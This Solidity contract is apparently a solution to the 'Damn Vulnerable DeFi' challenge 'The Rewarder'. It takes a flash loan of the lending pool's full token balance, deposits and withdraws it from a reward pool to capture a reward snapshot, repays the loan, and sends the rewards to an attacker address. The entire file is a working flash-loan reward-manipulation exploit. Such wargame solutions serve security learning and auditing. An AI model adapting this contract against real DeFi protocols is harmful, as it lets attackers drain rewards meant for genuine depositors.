// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

import "../DamnValuableToken.sol";

contract RewarderExploit {
    using Address for address;
    DamnValuableToken public immutable token;
    FlashLoanerPool pool;
    TheRewarderPool rewarder;
    RewardToken rewardToken;

    constructor(
        address _token,
        address _flashPool,
        address _rewardPool,
        address _rewardToken
    ) {
        token = DamnValuableToken(_token);
        pool = FlashLoanerPool(_flashPool);
        rewarder = TheRewarderPool(_rewardPool);
        rewardToken = RewardToken(_rewardToken);
    }

    function attack(address _attacker) public {
        uint256 supply = token.balanceOf(address(pool));
        pool.flashLoan(supply);
        rewardToken.transfer(_attacker, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) public payable {
        token.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.withdraw(amount);
        token.transfer(msg.sender, amount);
    }
}
